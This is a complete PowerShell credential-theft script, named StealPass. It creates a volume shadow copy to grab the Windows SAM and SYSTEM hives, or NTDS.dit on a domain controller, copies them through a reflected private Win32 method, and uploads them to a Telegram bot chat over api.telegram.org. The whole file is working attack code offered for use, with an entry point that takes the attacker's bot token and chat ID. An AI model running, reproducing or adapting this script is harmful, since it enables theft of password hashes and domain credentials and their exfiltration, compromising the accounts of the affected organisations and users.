function Send-FileToTelegram {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$TelegramBotToken,

        [Parameter(Mandatory = $true)]
        [string]$ChatId
    )

    $Uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
    $Form = @{
        chat_id = $ChatId
        document = [System.IO.File]::OpenRead($FilePath)
    }

    $Response = Invoke-RestMethod -Uri $Uri -Method Post -Form $Form
    
    if ($Response.ok) {
        Write-Output "File sent successfully to Telegram."
    } else {
        Write-Error "Failed to send file to Telegram: $($Response.description)"
    }
}

function StealPass { 
    <# 
    .SYNOPSIS 
        Copies either the SAM or NTDS.dit and system files to a specified directory. 
    .PARAMETER DestinationPath 
        Specifies the directory to the location where the password files are to be copied. 
    .PARAMETER TelegramBotToken 
        The token for the Telegram bot you created. 
    .PARAMETER ChatId 
        The chat ID of the user or group to send the files. 
    .OUTPUTS 
        None or an object representing the copied items. 
    .EXAMPLE 
        StealPass -DestinationPath "C:\temp" -TelegramBotToken "<Your_Bot_Token>" -ChatId "<Your_Chat_ID>" 
    #>
  
    [CmdletBinding()] 
    Param
    ( 
        [Parameter(Mandatory = $true, Position = 0)] 
        [ValidateScript({Test-Path $_ -PathType 'Container'})]  
        [ValidateNotNullOrEmpty()] 
        [String] 
        $DestinationPath,

        [Parameter(Mandatory = $true)] 
        [ValidateNotNullOrEmpty()] 
        [String] 
        $TelegramBotToken,

        [Parameter(Mandatory = $true)] 
        [ValidateNotNullOrEmpty()] 
        [String] 
        $ChatId
    )

    function Copy-RawItem {
        [CmdletBinding()] 
        [OutputType([System.IO.FileSystemInfo])] 
        Param ( 
            [Parameter(Mandatory = $True, Position = 0)] 
            [ValidateNotNullOrEmpty()] 
            [String]
            $Path, 

            [Parameter(Mandatory = $True, Position = 1)] 
            [ValidateNotNullOrEmpty()] 
            [String]
            $Destination, 

            [Switch]
            $FailIfExists
        )

        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')} 
        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native') 
        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))  

        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))) 
        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 

        if ($CopyResult -eq $False -and $HResult -ne 0) {
            throw ( New-Object ComponentModel.Win32Exception ) 
        } else {
            Write-Output (Get-ChildItem $Destination) 
        }
    }

    # Check for admin rights
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Error "Not running as admin. Run the script with elevated credentials"
        Return
    }

    # Get "vss" service startup type 
    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode 
    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual}  

    # Get "vss" Service status and start it if not running 
    $VssStatus = (Get-Service vss).status  
    if ($VssStatus -ne "Running") {Start-Service vss} 

    # Check to see if we are on a DC 
    $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
    $IsDC = $False
    if ($DomainRole -gt 3) { 
        $IsDC = $True
        $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File"
        $FileDrive = ($NTDSLocation).Substring(0,3) 
    } else {
        $FileDrive = $Env:HOMEDRIVE + '\'
    }

    # Create a volume shadow copy  
    $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
    $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible") 
    $ReturnValue = $ShadowCopy.ReturnValue 

    if ($ReturnValue -ne 0) { 
        Write-Error "Shadow copy failed with a value of $ReturnValue"
        Return
    }

    # Get the DeviceObject Address 
    $ShadowID = $ShadowCopy.ShadowID 
    $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject 

    # If not a DC, copy System and SAM to specified directory 
    if ($IsDC -ne $true) { 
        $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam" 
        $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"

        Copy-RawItem $SamPath "$DestinationPath\sam"
        Copy-RawItem $SystemPath "$DestinationPath\system"
    } else { 
        # Else copy the NTDS.dit and system files to the specified directory             
        $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit" 
        $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"

        Copy-RawItem $NTDSPath "$DestinationPath\ntds"
        Copy-RawItem $SystemPath "$DestinationPath\system"
    }

    # Send files to Telegram
    try {
        if ($IsDC -ne $true) { 
            Send-FileToTelegram -FilePath "$DestinationPath\sam" -TelegramBotToken $TelegramBotToken -ChatId $ChatId
            Send-FileToTelegram -FilePath "$DestinationPath\system" -TelegramBotToken $TelegramBotToken -ChatId $ChatId
        } else {
            Send-FileToTelegram -FilePath "$DestinationPath\ntds" -TelegramBotToken $TelegramBotToken -ChatId $ChatId
            Send-FileToTelegram -FilePath "$DestinationPath\system" -TelegramBotToken $TelegramBotToken -ChatId $ChatId
        }
    } catch {
        Write-Error "Error sending file to Telegram: $_"
    }

    # Return "vss" service to previous state 
    If ($VssStatus -eq "Stopped") {Stop-Service vss} 
    If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
}

# Entry point
param (
    [Parameter(Mandatory = $true)]
    [String] $DestinationPath,

    [Parameter(Mandatory = $true)]
    [String] $TelegramBotToken,

    [Parameter(Mandatory = $true)]
    [String] $ChatId
)

StealPass -DestinationPath $DestinationPath -TelegramBotToken $TelegramBotToken -ChatId $ChatId
